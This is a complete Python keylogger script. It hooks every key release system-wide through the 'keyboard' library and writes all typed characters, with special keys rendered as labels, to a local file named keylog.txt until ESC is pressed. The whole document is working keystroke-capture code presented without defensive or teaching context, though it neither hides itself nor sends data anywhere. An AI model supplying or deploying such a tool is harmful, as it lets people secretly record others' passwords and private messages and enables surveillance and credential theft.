import keyboard

class Keylogger():
    def __init__(self, log_filename):
        try:
            self.file = open(log_filename, "w")
        except Exception as e:
            print(f"Error opening file: {e}")
            exit(1)

        self.inputs = ["space", "enter", "tab", "backspace", "esc", "up", "down", "left", "right",
                       "shift", "ctrl", "alt", "caps lock", "delete", "home", "end",
                       "page up", "page down", "insert", "print screen", "pause",
                       "num lock", "scroll lock", "windows", "menu"]
        
        self.outputs = [" ", "\n", "\t", "[BACKSPACE]", "[ESC]", "[UP]", "[DOWN]", "[LEFT]", "[RIGHT]",
                        "[SHIFT]", "[CTRL]", "[ALT]", "[CAPSLOCK]", "[DEL]", "[HOME]", "[END]",
                        "[PAGEUP]", "[PAGEDOWN]", "[INS]", "[PRTSC]", "[PAUSE]",
                        "[NUMLOCK]", "[SCROLLLOCK]", "[WIN]", "[MENU]"]

    def start_log(self):
        keyboard.on_release(callback=self.callback)
        keyboard.wait()

    def callback(self, event):
        button = event.name

        if button == "esc":
            print("\nESC pressed. Stopping logger.")
            self.file.close()
            exit(0)

        for i in range(len(self.inputs)):
            if button == self.inputs[i]:
                button = self.outputs[i]
                break

        self.file.write(button)
        self.file.flush()

keylogger_object = Keylogger("keylog.txt")
keylogger_object.start_log()
